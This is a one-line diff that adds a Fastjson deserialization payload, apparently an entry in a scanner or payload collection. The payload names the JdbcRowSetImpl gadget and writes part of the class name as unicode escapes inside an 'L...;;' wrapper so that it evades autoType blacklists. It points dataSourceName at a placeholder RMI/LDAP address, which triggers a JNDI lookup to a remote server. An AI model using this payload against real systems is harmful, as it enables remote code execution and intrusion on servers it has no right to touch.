@@ -1,0 +1,1 @@
+{"@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"###RMI_LDAP_ADDRESS###","autoCommit":true}
